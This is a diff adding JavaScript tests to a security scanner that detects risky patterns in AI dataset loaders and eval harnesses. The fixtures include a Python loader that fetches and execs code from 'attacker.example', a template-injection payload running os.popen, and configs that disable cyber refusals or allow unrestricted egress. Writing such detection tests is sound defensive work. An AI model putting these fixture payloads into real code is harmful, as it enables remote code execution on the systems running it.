@@ -2423,4 +2423,47 @@ describe('AiInfraInventoryAgent', async () => {
       assert.equal(findings.length, 0);
     } finally { cleanup(dir); }
   });
+
+  // ── Lane 4: AI data pipelines & eval harnesses (P-IMP-046..048) ─────────
+
+  it('detects remote-code dataset loader (P-IMP-046)', async () => {
+    const dir = makeProject({ 'dataset/loader.py': 'import requests\ndata = requests.get("https://attacker.example/p.py")\nexec(data.text)\n' });
+    try {
+      const findings = await agent.analyze({ rootPath: dir, files: [path.join(dir, 'dataset/loader.py')], recon: {}, options: {} });
+      assert.ok(findings.some(f => f.rule === 'AI_DATASET_REMOTE_LOADER' && f.severity === 'critical'));
+    } finally { cleanup(dir); }
+  });
+
+  it('detects trust_remote_code flag (P-IMP-046)', async () => {
+    const dir = makeProject({ 'train.py': 'ds = load_dataset("someone/repo", trust_remote_code=True)\n' });
+    try {
+      const findings = await agent.analyze({ rootPath: dir, files: [path.join(dir, 'train.py')], recon: {}, options: {} });
+      assert.ok(findings.some(f => f.rule === 'AI_DATASET_TRUST_REMOTE_CODE'));
+    } finally { cleanup(dir); }
+  });
+
+  it('detects template injection in dataset config (P-IMP-047)', async () => {
+    const dir = makeProject({ 'dataset/dataset_infos.json': '{ "config_name": "{{ __import__(\'os\').popen(\'id\').read() }}", "splits": [] }' });
+    try {
+      const findings = await agent.analyze({ rootPath: dir, files: [path.join(dir, 'dataset/dataset_infos.json')], recon: {}, options: {} });
+      assert.ok(findings.some(f => f.rule === 'AI_DATASET_TEMPLATE_INJECTION' && f.severity === 'critical'));
+    } finally { cleanup(dir); }
+  });
+
+  it('detects eval-harness disabled guardrails (P-IMP-048)', async () => {
+    const dir = makeProject({ 'eval/config.yaml': 'evaluation:\n  name: ExploitGym\n  cyber_refusals: disabled\n' });
+    try {
+      const findings = await agent.analyze({ rootPath: dir, files: [path.join(dir, 'eval/config.yaml')], recon: {}, options: {} });
+      assert.ok(findings.some(f => f.rule === 'AI_EVAL_HARNESS_DISABLED_GUARDRAILS' && f.severity === 'high'));
+    } finally { cleanup(dir); }
+  });
+
+  it('detects eval-harness broad egress (P-IMP-048)', async () => {
+    const dir = makeProject({ 'sandbox.yaml': 'container:\n  internet_egress: unrestricted\n  tool_scope: [shell, code_exec]\n' });
+    try {
+      const findings = await agent.analyze({ rootPath: dir, files: [path.join(dir, 'sandbox.yaml')], recon: {}, options: {} });
+      assert.ok(findings.some(f => f.rule === 'AI_EVAL_HARNESS_BROAD_EGRESS'));
+      assert.ok(findings.some(f => f.rule === 'AI_EVAL_HARNESS_BROAD_TOOL_SCOPE'));
+    } finally { cleanup(dir); }
+  });
 });
